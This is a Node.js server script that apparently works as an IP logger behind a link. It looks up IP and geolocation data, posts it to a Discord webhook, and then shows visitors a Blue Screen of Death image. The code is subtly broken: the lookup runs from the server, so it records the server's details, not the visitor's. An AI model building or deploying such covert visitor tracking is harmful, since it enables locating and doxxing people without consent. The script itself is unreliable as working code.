require('dotenv').config();
const http = require('http');
const https = require('https');

const getClientInfo = (callback) => {
    https.get('https://ipconfig.io/json', (res) => {
        let data = '';

        res.on('data', (chunk) => {
            data += chunk;
        });

        res.on('end', () => {
            try {
                // Clean the response data and parse JSON
                const jsonString = data.trim();
                const cleanData = jsonString.replace(/[\u0000-\u001F]+/g, "");
                const json = JSON.parse(cleanData);
                callback(null, json);
            } catch (error) {
                callback(error);
            }
        });
    }).on('error', (err) => {
        callback(err);
    });
};

const sendToDiscordWebhook = (info) => {
    // Build the embed fields with optional chaining
    const embed = {
        embeds: [{
            title: "Client IP Information",
            fields: [
                { name: "IP", value: info.ip || 'N/A', inline: true },
                { name: "IP Decimal", value: info.ip_decimal ? info.ip_decimal.toString() : 'N/A', inline: true },
                { name: "Country", value: info.country || 'N/A', inline: true },
                { name: "Country ISO", value: info.country_iso || 'N/A', inline: true },
                { name: "Country EU", value: info.country_eu != null ? info.country_eu.toString() : 'N/A', inline: true },
                { name: "Latitude", value: info.latitude != null ? info.latitude.toString() : 'N/A', inline: true },
                { name: "Longitude", value: info.longitude != null ? info.longitude.toString() : 'N/A', inline: true },
                { name: "Time Zone", value: info.time_zone || 'N/A', inline: true },
                { name: "ASN", value: info.asn || 'N/A', inline: true },
                { name: "ASN Org", value: info.asn_org || 'N/A', inline: true },
                { name: "Hostname", value: info.hostname || 'N/A', inline: true },
                { name: "User Agent", value: (info.user_agent && info.user_agent.product) ? `${info.user_agent.product} ${info.user_agent.version} ${info.user_agent.comment}` : 'N/A', inline: false },
                { name: "Raw User Agent", value: (info.user_agent && info.user_agent.raw_value) ? info.user_agent.raw_value : 'N/A', inline: false }
            ]
        }]
    };

    const data = JSON.stringify(embed);

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    const url = new URL(webhookUrl);

    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (e) => {
        console.error(e);
    });

    req.write(data);
    req.end();
};

const requestListener = (req, res) => {
    getClientInfo((err, clientInfo) => {
        if (err) {
            console.error('Error getting IP info:', err);
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Internal Server Error');
            return;
        }

        sendToDiscordWebhook(clientInfo);

        // Serve the image
        const imageUrl = 'https://www.allion.com/wp-content/uploads/2020/12/BSOD.png';
        https.get(imageUrl, (imageRes) => {
            res.writeHead(200, { 'Content-Type': imageRes.headers['content-type'] });
            imageRes.pipe(res);
        }).on('error', (e) => {
            console.error('Error fetching image:', e);
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Internal Server Error');
        });
    });
};

const server = http.createServer(requestListener);
const port = 80;
server.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
